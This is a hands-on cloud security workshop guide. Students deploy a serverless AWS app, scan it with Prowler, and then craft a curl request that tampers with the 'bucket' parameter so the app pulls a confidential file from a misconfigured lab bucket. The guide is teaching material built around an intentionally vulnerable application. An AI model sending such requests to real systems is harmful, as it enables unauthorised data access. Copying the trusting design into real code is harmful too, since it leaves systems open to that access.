### **AWS IaC & Security Workshop Guide**

README on github

Welcome! In this workshop, you will use professional tools to deploy a serverless web application to AWS and then act as a security auditor to find and exploit a critical vulnerability.

**Objectives:**

- Get temporary, secure AWS credentials from an API.
- Use GitHub Actions and Terraform to deploy your own personal infrastructure.
- Use the AWS CLI to manage S3 resources.
- Use Prowler to perform a security audit.
- Discover and exploit a common web application vulnerability.

---

**Requirements:**

- aws cli

### **Part 1: Setup & Deployment**

### **Step 1: Get Your AWS Credentials**

Your instructor has provided you with a unique "fruit" name and a password.

1. Open your WSL/Linux terminal.
2. Run the `curl` command below, replacing `<your-fruit>` and `<your-password>` with the ones you were given.

Bash

Plain Text

```
curl -u "student:<your-password>" https://<instructor-api-url>/<Fruit>
```

1. The command will return a JSON object. Copy the `AccessKeyId`, `SecretAccessKey`, and `SessionToken` values. You will need them in a moment.

### **Step 2: Fork and Clone the Project**

1. Go to the `TUM-Workshop-Student-Infrastructure` repository on GitHub (Personal) and click the **Fork** button to create your own copy.
2. On your fork's GitHub page, click the green `**< > Code**` button and copy the HTTPS URL.
3. In your terminal, clone your fork:

Bash

Plain Text

```
git clone https://github.com/<your-username>/TUM-Workshop-Student-Infrastructure.git
```

1. Authenticate yourself with your GitHub credentials inside your terminal
    1. Here you have to use your PAT not your password
    2. If you don't have a PAT, create one on your GH Settings -> Developer settings -> PATs -> Tokens (classic) -> Generate new token (classic)
2. Navigate into the project directory and switch to the `s3` branch:

Bash

Plain Text

```
cd TUM-Workshop-Student-Infrastructuregit checkout s3
```

### **Step 3: Configure Your Secrets**

You need to provide your credentials and a new secret token to your repository's CI/CD pipeline.

1. **Generate a Token:** In your terminal, run this command to create a unique, random password for your application. Copy the output.

Bash

Plain Text

```
openssl rand -hex 16
```

1. **Set Secrets in GitHub:** In your forked repository on GitHub, go to **Settings > Secrets and variables > Actions**. Create the following four secrets:
    - `AWS_ACCESS_KEY_ID`: Paste the `AccessKeyId` you received in Step 1.
    - `AWS_SECRET_ACCESS_KEY`: Paste the `SecretAccessKey` you received.
    - `AWS_SESSION_TOKEN`: Paste the `SessionToken` you received.
    - `APP_TOKEN`: Paste the random token you just generated.

### **Step 4: Deploy Your Application**

1. Go to the **Actions** tab of your forked repository.
2. In the left sidebar, click on the **"Deploy Terraform to AWS"** workflow.
3. Click the **"Run workflow"** button, ensuring the `**s3**` **branch** is selected.
4. Wait for the pipeline to complete successfully. When it's finished, click on the completed run, go to the `Terraform Apply` step, and find the `**api_endpoint**` URL in the output. Copy this URL.

**Step 5: Test Your Application**

1. Call the API URL with your bucket, that you both got from your workflow outputs, and also with your token, that you generated.
2. After running the command you should have the image on your machine.
3. Run explorer.exe . to open the image.

Plain Text

```
#Replace placeholders with your valuescurl -H "Authorization: Bearer <your_app_token>" "https://<your_api_endpoint>/<StudentRole-Fruit_default>/fruit?bucket=your-bucket&file=fruitsalad.png" > fruitsalad.png
```

### **Part 2: The Security Lab**

### **Step 1: Configure aws credentials**

1. **Configure your CLI:** In your terminal, run the following three commands, pasting in the AWS credentials from Step 1.

Bash

Plain Text

```
export AWS_ACCESS_KEY_ID=<PASTE_YOUR_ACCESS_KEY_ID>export AWS_SECRET_ACCESS_KEY=<PASTE_YOUR_SECRET_ACCESS_KEY>export AWS_SESSION_TOKEN=<PASTE_YOUR_SESSION_TOKEN>
```

### **Step 2: The Security Audit (Discovery)**

Now you will act as a security auditor to find misconfigurations.

1. **Install Prowler:** We will use a Python virtual environment to keep our system clean.

Bash

Plain Text

```
python3 -m venv prowler-envsource prowler-env/bin/activatepip install prowler
```

1. **Run Prowler:** Run the scan. This can take 5-15 minutes.

Bash

Plain Text

```
prowler aws
```

1. **Analyze the Report:** Prowler will create an HTML report in the `output` directory. Open it and filter for S3 findings. You will find a misconfigured bucket named `**company-legacy-data-...**`.

### **Step 3: Investigate and Exploit**

1. **Find the Target File:** Use the AWS CLI to see what's inside the vulnerable bucket you found.

Bash

Plain Text

```
aws s3 ls s3://company-legacy-data-425861498673/
```

1.   
    You will see a file named `confidential-financials.txt`.
2. **The Exploit:** Your application code (`lambda/index.py`) is vulnerable because it trusts user input. Craft a `curl` command to trick your application into fetching the confidential file from the other bucket.

Bash

Plain Text

```
# Replace placeholders with your valuescurl -H "Authorization: Bearer <your_app_token>" "https://<your_api_endpoint>/<StudentRole-Fruit_default>/fruit?bucket=company-legacy-data-425861498673&file=confidential-financials.txt" > financials.txt
```

1. **View the Secret:** The command will print the contents of `confidential-financials.txt` directly to your terminal. Congratulations, you have completed the hack!

---

### **Part 3: Cleanup**

To avoid any unnecessary costs, you must delete all the resources you created.

1. Go to the **Actions** tab of your forked repository.
2. In the left sidebar, click on the **"Terraform Destroy"** workflow.
3. Click the **"Run workflow"** button, ensuring the `**s3**` **branch** is selected
